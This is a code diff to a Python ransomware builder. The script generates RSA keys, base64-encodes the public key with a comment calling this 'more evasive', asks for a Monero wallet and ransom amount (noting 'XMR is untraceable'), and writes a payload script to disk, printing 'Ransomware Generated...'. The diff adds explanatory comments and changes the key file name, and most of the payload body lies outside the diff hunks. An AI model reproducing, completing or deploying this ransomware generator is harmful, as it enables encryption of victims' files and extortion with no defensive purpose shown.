@@ -4,25 +4,27 @@ import shlex
 import base64
 from Crypto.PublicKey import RSA
 
+# Create the keys
 thekey = RSA.generate(2048)
 private_key = thekey.export_key()
 public_key = thekey.publickey().export_key()
 
-with open('private.key', 'wb') as private:
+# You only need the private key for decryption
+with open('private.pem', 'wb') as private:
     private.write(private_key)
 
-with open('public.key', 'wb') as public:
-    public.write(public_key)
-
+# Encode the public key to make it more evasive
 pubkey_encoded = base64.b64encode(public_key)
 filename = input("What would you like to name your file? ")
 wallet_address = input("Enter path to XMR wallet address: ")
 
+# Have an XMR wallet ready
 with open(wallet_address, "r") as thewallet:
     wallet = thewallet.read()
 
-quantity = input("How much XMR would you like to ransom? ")
+quantity = input("How much XMR would you like to ransom? ") # XMR is untraceable
 
+# The payload
 text = f"""
 #!/usr/bin/python3.9
 import base64
@@ -100,6 +102,7 @@ print(message)
 
 """
 
+# Generate the payload
 with open(filename, "w") as payload:
     payload.write(text)
     print("Ransomware Generated...")
